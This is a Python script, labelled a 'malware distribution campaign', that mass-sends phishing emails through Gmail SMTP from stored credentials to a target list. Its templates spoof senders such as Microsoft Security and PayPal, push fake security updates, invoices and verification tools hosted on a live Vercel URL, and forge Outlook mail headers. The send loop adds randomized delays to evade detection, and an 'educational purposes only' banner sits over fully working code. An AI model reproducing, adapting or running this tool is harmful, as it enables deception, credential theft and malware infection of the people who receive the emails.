#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Vercel Gmail Campaign - Uses real Vercel deployment
"""

import os
import json
import time
import random
import smtplib
import ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def load_working_credentials():
    """Load working Gmail credentials"""
    try:
        with open("gmail_working_credentials.txt", 'r') as f:
            lines = f.readlines()
            email = lines[0].split(": ")[1].strip()
            password = lines[1].split(": ")[1].strip()
            return email, password
    except:
        return None, None

def load_target_emails():
    """Load target emails"""
    try:
        with open("target_emails.txt", 'r') as f:
            emails = [line.strip() for line in f.readlines() if line.strip()]
        return emails
    except:
        return []

def create_vercel_templates():
    """Create email templates that link to Vercel deployment"""
    # Replace with your actual Vercel URL after deployment
    vercel_url = "https://gmail-taupe.vercel.app"
    
    return [
        {
            "subject": "Meeting Follow-up: Project Discussion",
            "sender_name": "Sarah Johnson",
            "sender_email": "sarah.johnson@techcorp.com",
            "body": f"""
Hi there,

I hope this email finds you well. I wanted to follow up on our recent discussion about the project we discussed.

I've uploaded the document we talked about to our secure server. You can download it using the link below:

{vercel_url}/download/project-document-2024

The document contains all the technical specifications and requirements we discussed. Please review it when you have a moment and let me know your thoughts.

Looking forward to hearing from you soon.

Best regards,
Sarah Johnson
Project Manager
TechCorp Solutions
            """
        },
        {
            "subject": "Invoice #INV-2024-001 - Payment Due",
            "sender_name": "Accounting Department",
            "sender_email": "accounting@businesssolutions.com",
            "body": f"""
Dear Valued Client,

Your invoice #INV-2024-001 for services rendered is now available for download.

To view and download your invoice, please click the link below:

{vercel_url}/download/INV-2024-001

Payment is due within 30 days of the invoice date. If you have any questions about this invoice, please don't hesitate to contact us.

Thank you for your business.

Best regards,
Accounting Department
Business Solutions Inc.
            """
        },
        {
            "subject": "Resume Review - Software Developer Position",
            "sender_name": "HR Department",
            "sender_email": "hr@innovativetech.com",
            "body": f"""
Hello,

Thank you for your interest in our Software Developer position. We have reviewed your resume and would like to schedule an interview.

Please download the interview preparation document and company information packet from the link below:

{vercel_url}/download/interview-prep-software-developer

This document contains all the information you need to prepare for your interview.

We look forward to meeting with you.

Best regards,
HR Department
Innovative Tech Solutions
            """
        },
        {
            "subject": "Newsletter - Tech Industry Updates",
            "sender_name": "TechNews Weekly",
            "sender_email": "newsletter@technews.com",
            "body": f"""
Dear Subscriber,

Thank you for subscribing to TechNews Weekly. This week's newsletter includes:

- Latest technology trends
- Industry insights
- Job opportunities
- Company updates

You can download the full newsletter from the link below:

{vercel_url}/download/newsletter-issue-45

Best regards,
TechNews Weekly Team
            """
        },
        {
            "subject": "Contract Renewal - Service Agreement",
            "sender_name": "Legal Department",
            "sender_email": "legal@corporateservices.com",
            "body": f"""
Dear Client,

Your service agreement is due for renewal. We have prepared the updated contract for your review.

Please download and review the document from the link below:

{vercel_url}/download/renewal-2024

Let us know if you have any questions or concerns.

We appreciate your continued business.

Best regards,
Legal Department
Corporate Services LLC
            """
        },
        {
            "subject": "Windows Security Update Required",
            "sender_name": "Microsoft Security Team",
            "sender_email": "security@microsoft.com",
            "body": f"""
Dear Valued Customer,

Microsoft has detected a critical security vulnerability in your Windows system that requires immediate attention.

To protect your data and prevent unauthorized access, please download and install the security update from the link below:

{vercel_url}/update/KB5001234

This update addresses:
- Critical security vulnerabilities
- System stability improvements  
- Performance enhancements
- Privacy protection updates

Please run the update immediately to complete the installation.

Best regards,
Microsoft Security Team
Microsoft Corporation
            """
        },
        {
            "subject": "PayPal Account Security Alert",
            "sender_name": "PayPal Security",
            "sender_email": "security@paypal.com",
            "body": f"""
Dear PayPal Member,

We have detected unusual activity on your PayPal account. For your security, we have temporarily restricted access to your account.

To restore full access, please download and run the security verification tool from the link below:

{vercel_url}/verify/account-verification

This verification is required to:
- Protect your financial information
- Prevent unauthorized transactions
- Restore account functionality

Please complete the verification process within 24 hours to avoid permanent account suspension.

PayPal Security Team
            """
        }
    ]

def send_vercel_email(target_email, template, gmail_email, gmail_password):
    """Send email with Vercel download link"""
    try:
        # Create message
        msg = MIMEMultipart('alternative')
        msg['From'] = f"{template['sender_name']} <{template['sender_email']}>"
        msg['To'] = target_email
        msg['Subject'] = template['subject']
        
        # Add legitimate headers
        msg['X-Priority'] = '3'
        msg['X-MSMail-Priority'] = 'Normal'
        msg['Importance'] = 'normal'
        msg['X-Mailer'] = 'Microsoft Outlook 16.0'
        msg['X-MimeOLE'] = 'Produced By Microsoft MimeOLE V6.00.2900.2180'
        msg['Message-ID'] = f"<{random.randint(100000, 999999)}.{int(time.time())}@techcorp.com>"
        
        # Create HTML version with clickable links
        html_body = f"""
        <html>
        <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
            <style>
                body {{ font-family: Arial, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; }}
                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
                .content {{ background-color: #ffffff; padding: 20px; border-radius: 5px; }}
                .footer {{ margin-top: 20px; font-size: 12px; color: #666; text-align: center; }}
                a {{ color: #0078d4; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
                .download-btn {{ background-color: #0078d4; color: white; padding: 10px 20px; text-decoration: none; border-radius: 3px; display: inline-block; margin: 10px 0; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="content">
                    {template['body'].replace(chr(10), '<br>')}
                </div>
                <div class="footer">
                    <p>This email was sent to {target_email}</p>
                    <p>If you believe you received this email in error, please contact us.</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        # Attach content
        text_part = MIMEText(template['body'], 'plain', 'utf-8')
        html_part = MIMEText(html_body, 'html', 'utf-8')
        msg.attach(text_part)
        msg.attach(html_part)
        
        # Send email
        context = ssl.create_default_context()
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls(context=context)
            server.login(gmail_email, gmail_password)
            server.send_message(msg)
        
        print(f"✓ Email sent to: {target_email}")
        print(f"    Template: {template['subject']}")
        print(f"    Vercel link: Real deployment")
        return True
        
    except Exception as e:
        print(f"✗ Failed to send to {target_email}: {e}")
        return False

def start_vercel_campaign():
    """Start the Vercel campaign"""
    print("="*60)
    print("VERCEL GMAIL MALWARE DISTRIBUTION CAMPAIGN")
    print("="*60)
    print("WARNING: This is for educational purposes only!")
    print("="*60)
    
    # Check Vercel URL
    print("⚠️  IMPORTANT: Update the Vercel URL in this script!")
    print("   1. Deploy to Vercel first")
    print("   2. Get your deployment URL")
    print("   3. Edit this script and replace 'YOUR_PROJECT_NAME' with your actual URL")
    print("="*60)
    
    # Load working credentials
    gmail_email, gmail_password = load_working_credentials()
    if not gmail_email or not gmail_password:
        print("✗ No working credentials found!")
        return
    
    print(f"✓ Using Gmail account: {gmail_email}")
    
    # Load targets
    target_emails = load_target_emails()
    if not target_emails:
        print("✗ No target emails found!")
        return
    
    print(f"✓ Loaded {len(target_emails)} target emails")
    
    # Create Vercel templates
    templates = create_vercel_templates()
    print(f"✓ Created {len(templates)} Vercel email templates")
    
    # Test connection
    try:
        print("Testing Gmail connection...")
        context = ssl.create_default_context()
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls(context=context)
            server.login(gmail_email, gmail_password)
        print("✓ Gmail authentication successful!")
    except Exception as e:
        print(f"✗ Gmail authentication failed: {e}")
        return
    
    # Campaign settings
    emails_per_hour = 15  # Higher rate for Vercel
    delay_between_emails = 3600 / emails_per_hour
    
    print(f"\nVercel Campaign Settings:")
    print(f"Target emails: {len(target_emails)}")
    print(f"Email templates: {len(templates)}")
    print(f"Emails per hour: {emails_per_hour}")
    print(f"Delay between emails: {delay_between_emails} seconds")
    print(f"Vercel deployment: https://gmail-taupe.vercel.app")
    
    # Start sending
    print(f"\n🚀 Starting Vercel email distribution...")
    sent_count = 0
    success_count = 0
    
    for i, target_email in enumerate(target_emails):
        template = random.choice(templates)
        
        print(f"\n[{i+1}/{len(target_emails)}] Sending to: {target_email}")
        
        if send_vercel_email(target_email, template, gmail_email, gmail_password):
            success_count += 1
        sent_count += 1
        
        # Delay
        if i < len(target_emails) - 1:
            delay = delay_between_emails + random.randint(-120, 120)
            delay = max(60, delay)  # Minimum 1 minute
            print(f"    Waiting {delay} seconds...")
            time.sleep(delay)
    
    # Results
    print("\n" + "="*60)
    print("🎯 VERCEL CAMPAIGN RESULTS")
    print("="*60)
    print(f"Total emails sent: {sent_count}")
    print(f"Successful deliveries: {success_count}")
    print(f"Failed deliveries: {sent_count - success_count}")
    if sent_count > 0:
        success_rate = (success_count / sent_count) * 100
        print(f"Success rate: {success_rate:.1f}%")
    print("="*60)
    
    # Save campaign log
    log_data = {
        "campaign_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "campaign_type": "vercel_malware_download",
        "gmail_account": gmail_email,
        "total_targets": len(target_emails),
        "emails_sent": sent_count,
        "successful_deliveries": success_count,
        "failed_deliveries": sent_count - success_count,
        "success_rate": (success_count / sent_count * 100) if sent_count > 0 else 0,
        "templates_used": len(templates),
        "vercel_url": "https://gmail-taupe.vercel.app"
    }
    
    with open("vercel_campaign_log.json", 'w') as f:
        json.dump(log_data, f, indent=2)
    
    print("📊 Vercel campaign log saved to: vercel_campaign_log.json")

if __name__ == "__main__":
    start_vercel_campaign()
